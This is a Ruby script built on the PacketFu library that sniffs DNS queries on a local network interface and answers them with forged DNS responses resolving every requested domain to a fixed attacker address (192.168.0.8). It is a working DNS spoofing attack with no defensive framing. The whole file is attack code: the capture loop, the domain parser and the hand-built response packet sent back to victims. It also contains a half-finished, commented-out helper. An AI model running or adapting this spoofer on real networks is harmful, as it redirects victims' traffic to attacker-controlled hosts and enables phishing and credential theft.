#!/usr/bin/ruby
require 'rubygems'
require 'packetfu'
require 'thread'
require 'macaddr'
require 'pp'

include PacketFu

$iface = 'em1'
$attacker_ip = IPAddr.new '192.168.0.8'

# Opens up the nic for capture.
def sniff(iface)
  pp 'Sniffing...'
  cap = Capture.new(:iface => iface, :start => true, :filter => 'udp and port 53', :save => true)
  cap.stream.each do |p|
    packet = Packet.parse p

    $dnsQuery = packet.payload[2].unpack('h*')[0].chr+packet.payload[3].unpack('h*')[0].chr

    if $dnsQuery == '10'
      domain, trans_id = get_info(packet)

      #generate_spoofDNS(domain, trans_id, packet)
      sendResponse(packet, domain)
    end

  end

end

def get_info(packet)
  # Get the length of the first domain level (in hex)
  len = "0x"+packet.payload[11].unpack('h*')[0].chr+packet.payload[12].unpack('h*')[0].chr

  # Start from the first letter
  i = 13;

  # Calculate the last value for the level
  last = i + len.hex

  # Initialize the domain string
  domain = String.new

  # Run in loop to handle infinite amount of levels
  x = true
  while x

    # Add the letters to the domain
    while i < last
      if packet.payload[i] != nil
        domain += packet.payload[i]
      end
      i += 1
    end

    # Get the new length for the next level(in hex)
    len = "0x"+packet.payload[i].unpack('h*')[0].chr

    # Increase counter to skip the length
    i += 1

    # Stop when we get a length of 0
    # otherwise add a '.' to the domain and calculate the new length
    if len == '0x0'
      x = false
    else
      domain += '.'
      last = i + len.hex
    end
  end

  puts "Spoofing to: " + domain


  return domain
end

def generate_spoofDNS(domain, transID, packet)
  newDomain = split_domain(domain)+'\x00'

#  attacker1 = $attacker_ip.split('.')
  #attackerHex = [attacker1[0].to_i,attacker1[1].to_i,attacker1[2].to_i,attacker1[3].to_i].pack('c*')
  pp "TransID: " + transID

  udp_pkt = UDPPacket.new
  udp_pkt.eth_saddr = packet.eth_daddr
  udp_pkt.eth_daddr = packet.eth_saddr
  udp_pkt.udp_dst = packet.udp_src
  udp_pkt.udp_src = 53
  udp_pkt.ip_saddr = packet.ip_daddr
  udp_pkt.ip_daddr = packet.ip_saddr

  udp_pkt.payload = transID +"\x81\x80".unpack('H') + $attacker_ip.hton


  #udp_pkt.payload = transID+"\x81\x80".hex+"\x00\x01"+"\x00\x01"+"\x00\x00"+"\x00\x00"+"\x03\x77"+"\x77\x77"+"\x09\x77"+"\x69\x6b"+"\x69\x70"+"\x65\x64"+"\x69\x61"+"\x03\x6f"+"\x72\x67"+"\x00"
  #udp_pkt.payload += "\x00\x01"+"\x00\x01"+"\xc0\x0c"+"\x00\x01"+"\x00\x01"+"\x00\x00"+"\x02\x58"
  #udp_pkt.payload += "\x00\x04"+$attacker_ip.hton

  pp "Payload: " + udp_pkt.payload

end

def sendResponse(packet, domainName)

  # Convert the IP address
  facebookIP = "192.168.0.8"
  myIP = facebookIP.split(".");
  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')

  # Create the UDP packet
  response = UDPPacket.new
  response.udp_src = packet.udp_dst
  response.udp_dst = packet.udp_src
  response.ip_saddr = packet.ip_daddr
  response.ip_daddr = packet.ip_saddr
  response.eth_daddr = packet.eth_saddr

  # Transaction ID
  response.payload = packet.payload[0,2]

  response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"

  # Domain name
  domainName.split(".").each do |section|
    response.payload += section.length.chr
    response.payload += section
  end

  # Set more default values...........
  response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
  response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"

  # IP
  response.payload += myIP2

  # Calculate the packet
  response.recalc

  # Send the packet out
  response.to_w($iface)

end

def split_domain(domain)
  split = domain.split('.')
  newDomain = String.new
  split.each { |s|
    len = '%02X' % s.length
    newDomain += '\\x' + len + s


  }
  return newDomain
end

sniff($iface)